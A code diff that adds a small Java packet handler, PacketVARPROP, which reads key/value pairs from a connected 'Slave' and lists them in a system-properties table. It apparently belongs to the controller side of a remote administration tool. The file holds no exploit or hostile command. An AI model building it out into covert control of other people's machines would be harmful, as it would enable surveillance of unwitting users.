@@ -1,0 +1,19 @@
+package com.redpois0n.packets.in;
+
+import java.io.DataInputStream;
+
+import com.redpois0n.Slave;
+import com.redpois0n.ui.frames.FrameSystem;
+
+public class PacketVARPROP extends AbstractIncomingPacket {
+
+	public void read(Slave slave, DataInputStream dis) throws Exception {
+		FrameSystem frame = FrameSystem.instances.get(slave);
+		String key = slave.readLine();
+		String value = slave.readLine();
+		if (frame != null) {
+			frame.model.addRow(new Object[] { key, value });
+		}
+	}
+
+}
